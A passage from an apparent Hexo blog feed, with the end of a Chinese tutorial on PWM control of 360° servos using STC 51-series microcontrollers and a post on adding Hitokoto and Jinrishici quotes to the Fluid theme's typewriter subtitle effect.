TMOD=<span class="hljs-number">0x02</span>;<span class="hljs-comment">//T0方式2</span><br>    TH0=<span class="hljs-number">0xb2</span>; <span class="hljs-comment">//12MH时</span><br>    TL0=<span class="hljs-number">0xb2</span>;<br>    TR0=<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//频率为50HZ 周期的1/50=0.02s,将0.02S分成256分：0.02/256=0.000078125S=0.078125ms</span><br><span class="hljs-comment">//0.078125为一份的时间 一共256份</span><br><span class="hljs-comment">//CCAP0L=223;CCAP0H=223;为2.5ms //243时约为1ms (0.9375)</span><br><span class="hljs-comment">//CCAP0L=249;CCAP0H=248;为0.5ms //236时为1.5ms (1.484375)</span><br>                                <span class="hljs-comment">//230为2ms (2.03125)</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>   ini_T0();  <span class="hljs-comment">//方式2，0.078125ms溢出，每溢出一次CL加1</span><br>    CMOD=<span class="hljs-number">0x04</span>;<span class="hljs-comment">//定时器0溢出率作为时钟输入</span><br>    <span class="hljs-comment">//CIDL - - -  CPS2 CPS1 CPS0 ECF</span><br>    <span class="hljs-comment">//--------------------------------</span><br>    <span class="hljs-comment">//CIDL:计数阵列空闲控制，0时，空闲模式下PCA计数器继续工作；1时空闲模式PCA停止工作。</span><br>    <span class="hljs-comment">//----------------------------------------------</span><br>    <span class="hljs-comment">//CPS2 CPS1 CPS0: PCA计数脉冲选择</span><br>    <span class="hljs-comment">//000:系统时钟，FOSC/12</span><br>    <span class="hljs-comment">//001:系统时钟，FOSC/2</span><br>    <span class="hljs-comment">//010:定时器0的溢出，可实现可调频率PWM输出</span><br>    <span class="hljs-comment">//011:ECI/P3.4脚的外部时钟输入(最大速率FOSC/2)</span><br>    <span class="hljs-comment">//100:系统时钟,FOSC</span><br>    <span class="hljs-comment">//101:系统时钟/4,FOSC/4</span><br>    <span class="hljs-comment">//110:系统时钟/6,FOSC/6</span><br>    <span class="hljs-comment">//111:系统时钟/8,FOSC/8</span><br>    <span class="hljs-comment">//-----------------------------------------------</span><br>    <span class="hljs-comment">//ECF:PCA计数溢出中断使能:1时，使能寄存器CCON CF位的中断。0时禁止该功能。</span><br>    CL=<span class="hljs-number">0x00</span>;<span class="hljs-comment">//清零自由递增计数的16位定时器的值</span><br>    CH=<span class="hljs-number">0x00</span>;<span class="hljs-comment">//CH0为00  看结构图，CL前面是永远是0</span><br>  <br>    <span class="hljs-comment">//CCAP0L=223;//装入比较初值</span><br>    <span class="hljs-comment">//CCAP0H=223;</span><br>    PCA_PWM0=<span class="hljs-number">0x00</span>; <span class="hljs-comment">//EPC0H=0,EPC0L=0</span><br>    CCAPM0=<span class="hljs-number">0x42</span>;<span class="hljs-comment">//设置ECOM1=1,PWM1=1.</span><br>  <br>    <span class="hljs-comment">//CCAP1L=223;</span><br>    <span class="hljs-comment">//CCAP1H=223;</span><br>    PCA_PWM1=<span class="hljs-number">0x00</span>;<span class="hljs-comment">//EPC1H=0,EPC1L=0</span><br>    CCAPM1=<span class="hljs-number">0x42</span>;<span class="hljs-comment">//设置ECOM1=1,PWM1=1.</span><br>    CR=<span class="hljs-number">1</span>;<span class="hljs-comment">//CR=1,启动PCA阵列计数。  看151页，其中和CMOD的CIDL位有关，又和IDLE有关，看183页。</span><br>  <br>  <br>    <span class="hljs-comment">//AUXR1=0xc0;//PWM0从P1.3切换到P4.2</span><br>       <span class="hljs-comment">//PWM1从P1.4切换到P4.3</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>    <span class="hljs-comment">//========================两舵机停止，中位调节用</span><br>        CCAP0L=<span class="hljs-number">236</span>;<span class="hljs-comment">//装入比较初值</span><br>        CCAP0H=<span class="hljs-number">236</span>;<br>        CCAP1L=<span class="hljs-number">230</span>;<span class="hljs-comment">//装入比较初值</span><br>        CCAP1H=<span class="hljs-number">230</span>;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至于怎么调整pwm的高电平，修改上面CCAPXL和CCAPXH就可以了。是不是大功告成了呢？并没有！测试中我在示波器上发现，CCAPXH和CCAPXL的值每改变1，PWM高电平改变0.07ms左右。那么问题来了，在前面我提到过，360°舵机调速的区间，只有0.1ms(1.47-1.37=0.1），这个0.07，是可以让舵机实现正转反转，以及停止，但是没办法调速，循迹小车是需要控制车子两侧的轮子产生转速差来控制方向的，没法调速，就没法实现循迹。造成这个问题的原因是什么？8位的pwm模块，8位的pwm，上面程序中的注释中有这样一段:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//频率为50HZ 周期的1/50=0.02s,将0.02S分成256分：0.02/256=0.000078125S=0.078125ms</span><br><br><span class="hljs-comment">//0.078125为一份的时间 一共256份</span><br></code></pre></td></tr></table></figure><p>很清楚了吧！频率50HZ就是周期为20ms的PWM，8位的计数器，最大值是256，精度只能到0.07ms左右。</p><h1 id="51单片机还能控制360°舵机吗？"><a href="#51单片机还能控制360°舵机吗？" class="headerlink" title="51单片机还能控制360°舵机吗？"></a>51单片机还能控制360°舵机吗？</h1><p>那么是不是51单片机控制不了360°舵机呢？当然还是可以控制的，关键要选择一款好芯片。我最终发现了<code>STC15W4K32S4</code>系列单片机，这个系列的芯片带6路15位的PWM波形发生器，也有16位的定时器，自动重装模式能够实现8~16位的PWM。真的挺服STC的产品线的，他还有一个STC15系列单片机，不带PWM波形发生器。我真以为它15打头的全系都不带PWM波形发生器。</p><p>具体的程序在这里我就不列出来了，<code>STC15W4K32S4</code>自带pwm波形发生器的示例代码在<a href="http://www.stcmcudata.com/datasheet/stc/STC-AD-PDF/STC15.pdf">官方文档</a>的1056页，自动重装模式实现8~16位PWM的示例代码在<a href="http://www.stcmcudata.com/datasheet/stc/STC-AD-PDF/STC15.pdf">官方文档</a>的991页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//对于15位PWM波形发生器而言，频率为50HZ 周期的1/50=0.02s,将20ms分成32768份：20/32768≈0.0006ms</span><br><br><span class="hljs-comment">//0.0006为一份的时间 一共32768份</span><br></code></pre></td></tr></table></figure><p>所以，15位的PWM波形发生器，精度足够生成能够控制舵机的PWM了。</p><h1 id="舵机供电很重要"><a href="#舵机供电很重要" class="headerlink" title="舵机供电很重要"></a>舵机供电很重要</h1><p>前面所述，360°舵机的控制基本上能通过<code>STC15W4K32S4</code>系列单片机或者其他带15、16位PWM波形生成器的单片机解决，其实180°舵机相似，程序都是一样的。但是，尤其需要注意一下供电的问题，舵机要求的电压为6v-7.2v，你也许会发现5v其实舵机也能转，但是，低电压会带来很多未知的问题，比如舵机乱转，曾经有一段时间，我陷入舵机乱转的怪圈，我以为是我程序的问题，但是示波器显示没问题，以至于我以为是舵机坏了。实际上，是电池的问题，电池用的时间长了，电压不足，让舵机乱转。所以，建议使用航模sss电池，这个电池是11.2V的，使用降压模块，降成7.2v，给舵机供电，降成5v给单片机和传感器供电就行了。</p><h1 id="尾巴（听我一句劝环节）"><a href="#尾巴（听我一句劝环节）" class="headerlink" title="尾巴（听我一句劝环节）"></a>尾巴（听我一句劝环节）</h1><p>其实，舵机的控制，很简单，保证硬件上供电的稳定，保证软件上，能输出稳定、精度够高的PWM就足够了。个人觉得，这里面最大的坑，莫过于我们学习单片机的过程中，资料太过老旧。我学习51单片机那会儿，教程中使用的STC89、90系列的单片机，速度慢、外设少、价格高。也许当你抱着学习的心态去对待，没有太大的问题。但我相信，能看到这里的我相信，大概率是都对机器人制作感兴趣，刚学单片机（51），然后舵机控制遇到了问题；大概率都是希望通过单片机这样一个工具，去实现自己的一些创意，去做一些小玩意儿出来的。<strong>这种情况下，一款老旧的芯片，会给你带来很多不必要的麻烦。</strong></p><blockquote><p>PWM这一个场景为例，就像文本所述，从STC90系列单片机到STC12系列单片机，单片机本身外设太差导致PWM的精度始终达不到要求。当我使用<code>STC15W4K32S4</code>让舵机稳定转起来的时候，心里面真的长舒一口气。当我学习STM32F103时，在示波器上看到无比精准的PWM时，除了吃惊，还有一点想笑，自己要是不学51单片机，直接用STM32，哪有这么多事？</p></blockquote><p>但，听我一句劝吧：<strong>作为电子设计的初学者，选择一个性能合适的芯片真的很重要。注意，我这里说的是合适。</strong>比如本文提到的舵机控制的场景：</p><ul><li>我们可以使用51单片机（<code>STC15W4K32S4</code>）实现，前提是，你真的吃透51单片机，看得懂数据手册上不同寄存器是啥意思，<code>STC15W4K32S4</code>能输出精度够用的PWM。</li><li>我们可以使用arduino实现，那我们就不需要懂寄存器什么的，我们照着各种教程的程序，改一改就能实现，arduino能输出精度很够用的PWM。</li><li>我们可以使用STM32库开发实现，前提是，我们起码知道怎么调库函数，各种库函数是在干什么，STM32能输出精度完美的PWM。</li><li>我们可以使用STM32 HAL开发实现，配置一下功能，自动生成工程，稍微改动代码，就能实现，STM32能输出精度完美的PWM。</li><li>我们可以使用Mbed开发实现，前提是你英文水平还行，起码看得懂英文文档，Mbed支持的ARM芯片能输出精度完美的PWM。</li><li>我们可以使用树莓派实现。前提是你稍微掌握一点linux的基本知识，学一点python，甚至用C语言都能实现，树莓派能输出精度完美的PWM。</li></ul><p>跳出舒适圈，是一件很不容易的事儿，特别是抛弃自己学会的东西，去学一个新的东西。我自己在最初的学习过程中，十分畏惧新的东西，所以想在这里把自己的经验分享出来：</p><ul><li>arduino上手真的比51单片机容易，做个简单的项目真的比51单片机好用。</li><li>STM32也没有想象中那么复杂，51单片机学习需要10天，STM32一个月也就会用了吧。</li><li>树莓派没有什么上来就linux，听起来的那么复杂，linux和windows一样，就是个操作系统，我们在上面写程序跑就行了，python写代码比C语言简单多了。</li></ul>]]></content>
    
    
    <categories>
      
      <category>电子设计</category>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>电子设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>给你的fluid主题加入一言吧！</title>
    <link href="/posts/11640910.html"/>
    <url>/posts/11640910.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>你是否想过，在别人访问你网站的时候，能动态的展示一句话呢？这句话可能是根据访客的地理位置、时间、天气返回的诗句，可能是网抑云上生而为人我很抱歉的评论？本篇文章介绍了如何给hexo的fluid主题的打字机特效插入Hitokoto和今日诗词，实现上面效果。</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你是否想过，在别人访问你网站的时候，能动态的展示一句话呢？这句话可能是根据访客的地理位置、时间、天气返回的诗句，可能是网抑云上生而为人我很抱歉的评论？本文介绍的<a href="https://hitokoto.cn/">Hitokoto</a>和<a href="https://www.jinrishici.com/">今日诗词</a>（这俩玩意儿在本文的后续中就称作<strong>一言</strong>吧），就是干这个事儿的。</p><p>一言的API，实际上是提供了一个JavaScript脚本，向网页html文件中的某个位置插入这个JavaScript脚本，就会在用户访问页面的时候自动调用，获取相应的语句并显示出来。之前，我网站的主题没有什么动态效果，副标题是直接显示的，所以我简单看了一下主题的源码，在副标题的位置很顺利插入了<a href="https://www.jinrishici.com/">今日诗词</a>。但我最近给hexo更换了新的主题（<a href="https://github.com/fluid-dev/hexo-theme-fluid">fluid</a>），这个主题的是自带打字机特效的（就是像打字一样，把一串文本一个一个显示出来），副标题的显示本身就是通过一个JavaScript脚本实现的，在一个JavaScript脚本中，就没办法直接插入一言提供的JavaScript脚本了。</p><p>本篇文章介绍了如何给hexo的fluid主题的打字机特效（打字机特效就是下面这个动图显示的效果），插入一言，先来看一下效果吧~</p><div id="mmedia-iaINbMCi"></div><script src="https://cdn.jsdelivr.net/npm/dplayer/dist/DPlayer.min.js"></script>      <script>        var dp_iaINbMCi = new DPlayer({            container: document.getElementById('mmedia-iaINbMCi'),            autoplay: false,            theme: '#b7daff',            loop: false,            lang: navigator.language,            screenshot: false,            hotkey: true,            preload: 'auto',            logo: '',            volume: 0.7,            mutex: true,            video: { url: 'https://pic.gaficat.com/default/%E6%89%93%E5%AD%97%E6%9C%BA%E4%B8%80%E8%A8%80%E6%95%88%E6%9E%9C.mov', pic: '', thumbnails: '', type: 'auto'},                                    contextmenu: [{text: 'hexo-tag-mmedia', link: 'https://github.com/MonoLogueChi/hexo-tag-mmedia'}],            highlight: [],            undefined        });        dp_iaINbMCi.on("fullscreen", function () { if (/Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) { screen.orientation.lock("landscape"); }});              </script>        <p>当然啦，也可以直接访问本站的<a href="https://www.gaficat.com/">首页</a>，查看实际的效果：随机调用<a href="https://hitokoto.cn/">Hitokoto</a>和<a href="https://www.jinrishici.com/">今日诗词</a>其中一个显示副标题。</p><h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><h2 id="JS脚本不能插入另一个JS脚本"><a href="#JS脚本不能插入另一个JS脚本" class="headerlink" title="JS脚本不能插入另一个JS脚本"></a>JS脚本不能插入另一个JS脚本</h2><p>我完全不懂前端，一点不会JavaScript，所以一开始的想法是，在原来打字机特效的JavaScript脚本里面插入一言的JavaScript脚本不就行了？我也不改代码啥的，对吧！然而，这样肯定是不行的。</p><p>首先，一个JavaScript脚本在html里面的格式如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>alert(<span class="hljs-string">&quot;我的第一个 JavaScript&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>那么下面这样的格式肯定是有问题的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    &lt;script&gt;alert(<span class="hljs-string">&quot;这是一言的JavaScript&quot;</span>);&lt;/script&gt;<br>    alert(<span class="hljs-string">&quot;这是打字机特效的JavaScript&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>那咋样是允许的呢？下面这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是一言的JavaScript&quot;</span>);<br>&lt;/script&gt;<br><br>&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;我的打字机特效的JavaScript&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="全局变量咋共享？"><a href="#全局变量咋共享？" class="headerlink" title="全局变量咋共享？"></a>全局变量咋共享？</h2><p>按照上一小节说的，JavaScript允许的格式，是一言的JavaScript和打字机特效的JavaScript并列各自运行。那这两个JavaScript显示内容的逻辑是什么样的？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是一言的JavaScript&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我先获取今日随机的一句话&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我获取到随机的一句话了，现在我显示这个内容&quot;</span>);<br>&lt;/script&gt;<br><br>&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是打字机特效的JavaScript&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我设置要显示的内容为副标题&quot;</span>);<br>    alert(<span class="hljs-string">&quot;现在我显示相关内容&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>那这样搞，打字机是动态显示的，一言是静态直接显示内容的，这不就乱套了吗？能不能先把一言的JavaScript脚本跑一遍，然后获取到的结果存到一个全局变量里面，最后打字机特效的JavaScript脚本里面用这个全局变量不就行了嘛？逻辑就是下面这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> global_somthing=<span class="hljs-string">&quot;&quot;</span>;<br>&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是一言的JavaScript&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我先获取今日随机的一句话&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我把global_somthing赋值为刚才获取到的一句话&quot;</span>);<br>&lt;/script&gt;<br><br>&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;接下来是打字机特效的JavaScript的内容&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我把要显示的内容设为global_somthing变量&quot;</span>);<br>  alert(<span class="hljs-string">&quot;现在我开始动态显示&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>然而，理想很丰满，现实很残酷，一言提供的JavaScript脚本，是直接在脚本里面显示结果的，<strong>我暂时没有找到办法，实现上面的逻辑，把一言JavaScript脚本获取到的结果，存到一个全局变量里面，给打字机特效的JavaScript使用。</strong></p><blockquote><p>这里我是真不懂，有大神可以指正哈。我感觉，不同JavaScript脚本之间的关系，不像python上不同的函数的关系，它更像是不同python文件各自跑起来之间的关系，是在不同的进程中的，他们之间的变量要共享，也许有办法，但是我这种小白肯定是没辙了。</p></blockquote><h2 id="Hitokoto终于搞定"><a href="#Hitokoto终于搞定" class="headerlink" title="Hitokoto终于搞定"></a>Hitokoto终于搞定</h2><p>Hitokoto提供的JavaScript逻辑是这样的:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    alert(<span class="hljs-string">&quot;这是Hitokoto的JavaScript&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我先通过http获取随机的一句话&quot;</span>);<br>    alert(<span class="hljs-string">&quot;现在我显示global_somthing的内容&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>所以我想，打字机的特效是一个JavaScript，一言也是JavaScript，我给他们整合到一起不就成了？逻辑就是下面这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是我们整合的JavaScript&quot;</span>);<br>  <span class="hljs-keyword">var</span> global_somthing=<span class="hljs-string">&quot;&quot;</span>;<br><br>    alert(<span class="hljs-string">&quot;接下来是Hitokoto JavaScript的内容&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我先通过http获取随机的一句话&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我把global_somthing赋值为刚才获取到的一句话&quot;</span>);<br><br>  alert(<span class="hljs-string">&quot;接下来是打字机特效的JavaScript的内容&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我把要显示的内容设为global_somthing变量&quot;</span>);<br>  alert(<span class="hljs-string">&quot;现在我开始动态显示&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>结果当然是可行的，没有任何问题。</p><h2 id="今日诗词终于搞定"><a href="#今日诗词终于搞定" class="headerlink" title="今日诗词终于搞定"></a>今日诗词终于搞定</h2><p>那只使用Hitokoto感觉挺亏的，毕竟今日诗词提供的内容也挺棒的，也把今日诗词做一波整合呗？今日诗词的JavaScript逻辑是这样的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是今日诗词的JavaScript&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我定义了一大堆的函数，用来获取相关内容&quot;</span>);<br>&lt;/script&gt;<br><br>&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是今日诗词的JavaScript&quot;</span>);<br>  alert(<span class="hljs-string">&quot;我调用上一个JavaScript脚本中定义的函数，显示相关内容&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>乍一看，这玩意儿跟Hitokoto长得不一样啊？你为啥不弄成Hitokoto那种逻辑，我整合也好整合，是吧。但是，相信今日诗词有他自己的考虑，我们暂时不吐槽他，想办法解决呗。</p><blockquote><p>我虽然看不懂今日诗词的JavaScript，但是感觉因为今日诗词是根据时间、IP地点、季节等信息，智能地返回一句诗词，所以不像Hitokoto直接通过http随机获取一句就完事了，他可能需要在访客端执行一些东西，才能完整的显示这些信息。</p></blockquote><p>那咋整麽，死马当活马医呗，所以我的逻辑是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是今日诗词的JavaScript&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我定义了一大堆的函数，用来获取相关内容&quot;</span>);<br>&lt;/script&gt;<br><br>&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是我们整合的JavaScript&quot;</span>);<br>  <span class="hljs-keyword">var</span> global_somthing=<span class="hljs-string">&quot;&quot;</span>;<br><br>  alert(<span class="hljs-string">&quot;接下来是今日诗词JavaScript的内容&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我直接调用今日诗词JavaScript定义的获取诗句的函数A&quot;</span>);<br>  alert(<span class="hljs-string">&quot;我把global_somthing赋值为函数A的执行结果&quot;</span>);<br><br>    alert(<span class="hljs-string">&quot;接下来是打字机特效的JavaScript的内容&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我把要显示的内容设为global_somthing变量&quot;</span>);<br>  alert(<span class="hljs-string">&quot;现在我开始动态显示&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>结果当然也是可行的，那在之前的小节，不是说过，不同JavaScript脚本之间的变量没办法共享吗？这里为啥可以不同的JavaScript脚本调用对方定义的函数？这里我感觉吧，懂的自然懂，不懂的跟我一样，一脸懵逼。总之呢，这么做，确实是可行的。</p><h2 id="随机调用Hitokoto和今日诗词"><a href="#随机调用Hitokoto和今日诗词" class="headerlink" title="随机调用Hitokoto和今日诗词"></a>随机调用Hitokoto和今日诗词</h2><p>那，打字机特效已经能和Hitokoto、今日诗词做整合了，那我想随机调用这俩种的一个，显示出来，咋处理呢？加一个随机数判断就完事了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是今日诗词的JavaScript&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我定义了一大堆的函数，用来获取相关内容&quot;</span>);<br>&lt;/script&gt;<br><br>&lt;script&gt;<br>  alert(<span class="hljs-string">&quot;这是我们整合的JavaScript&quot;</span>);<br>  <span class="hljs-keyword">var</span> global_somthing=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">Math</span>.random() &lt; <span class="hljs-number">0.5</span>)&#123;<br>    alert(<span class="hljs-string">&quot;接下来是Hitokoto JavaScript的内容&quot;</span>);<br>        alert(<span class="hljs-string">&quot;我先通过http获取随机的一句话&quot;</span>);<br>        alert(<span class="hljs-string">&quot;我把global_somthing赋值为刚才获取到的一句话&quot;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    alert(<span class="hljs-string">&quot;接下来是今日诗词JavaScript的内容&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我直接调用今日诗词JavaScript定义的获取诗句的函数A&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我把global_somthing赋值为函数A的执行结果&quot;</span>);<br>  &#125;<br><br>    alert(<span class="hljs-string">&quot;接下来是打字机特效的JavaScript的内容&quot;</span>);<br>    alert(<span class="hljs-string">&quot;我把要显示的内容设为global_somthing变量&quot;</span>);<br>  alert(<span class="hljs-string">&quot;现在我开始动态显示&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>实际测试，这个逻辑很完美。</p><h2 id="文章页的标题能不显示一言吗？"><a href="#文章页的标题能不显示一言吗？" class="headerlink" title="文章页的标题能不显示一言吗？"></a>文章页的标题能不显示一言吗？</h2><p>按照上一节的逻辑，已经可以正常使用打字机特效显示一言了，但是我发现，hexo的fluid，打字机特效没有做太多的判断，会把文章页的文章名也判定为副标题，所以就会出现一个问题，首页、标签页、分类页、文章页都会显示打字机特效，但文章页的文章名也会判定为副标题，也会跟一长串一言显示的内容，这个肯定是我们不希望看到的。</p><p>其实，这篇文章讲了这么多，截止目前，这么多代码最终都是要加到hexo主题的ejs文件中的，ejs文件我们可以理解为hexo主题的模板，这个模板可以根据hexo的结构，针对不同的页面做不同的布局，添加不同的JavaScript脚本。那么，就打字机特效这个场景，我们可以在ejs模板中，针对首页、标签页、分类页、文章页做不同的处理，比如首页我就显示网站的副标题+一言，其他页面我就只显示副标题。那么，打字机ejs模板的逻辑就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;% if(is_home()) &#123; %&gt;<br>  &lt;script&gt;<br>    alert(&quot;这是今日诗词的JavaScript&quot;);<br>    alert(&quot;我定义了一大堆的函数，用来获取相关内容&quot;);<br>  &lt;&#x2F;script&gt;<br><br>  &lt;script&gt;<br>    alert(&quot;这是我们整合的JavaScript&quot;);<br>    var global_somthing&#x3D;&quot;&quot;;<br>    if(Math.random() &lt; 0.5)&#123;<br>      alert(&quot;接下来是Hitokoto JavaScript的内容&quot;);<br>      alert(&quot;我先通过http获取随机的一句话&quot;);<br>      alert(&quot;我把global_somthing赋值为刚才获取到的一句话&quot;);<br>    &#125;else&#123;<br>      alert(&quot;接下来是今日诗词JavaScript的内容&quot;);<br>      alert(&quot;我直接调用今日诗词JavaScript定义的获取诗句的函数A&quot;);<br>      alert(&quot;我把global_somthing赋值为函数A的执行结果&quot;);<br>    &#125;<br><br>    alert(&quot;接下来是打字机特效的JavaScript的内容&quot;);<br>    alert(&quot;我把要显示的内容设为global_somthing变量&quot;);<br>    alert(&quot;现在我开始动态显示&quot;);<br>  &lt;&#x2F;script&gt;<br>&lt;% &#125; else &#123; %&gt;<br>    &lt;script&gt;<br>  alert(&quot;这是打字机特效的JavaScript&quot;);<br>    alert(&quot;我设置要显示的内容为副标题&quot;);<br>    alert(&quot;现在我显示相关内容&quot;);<br>&lt;&#x2F;script&gt;<br>&lt;% &#125; %&gt;<br></code></pre></td></tr></table></figure><p>上面代码中的<code>is_home()</code>就是hexo提供的<a href="https://hexo.io/zh-cn/docs/helpers.html">辅助函数</a>，上面逻辑，最终就会实现我的网站当前的效果，只有主页使用打字机特效显示一言的效果，其他页面正常使用打字机特效，显示副标题内容。</p><h1 id="ToDo"><a href="#ToDo" class="headerlink" title="ToDo"></a>ToDo</h1><ol><li>找到fluid主题的打字机特效ejs模板文件。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 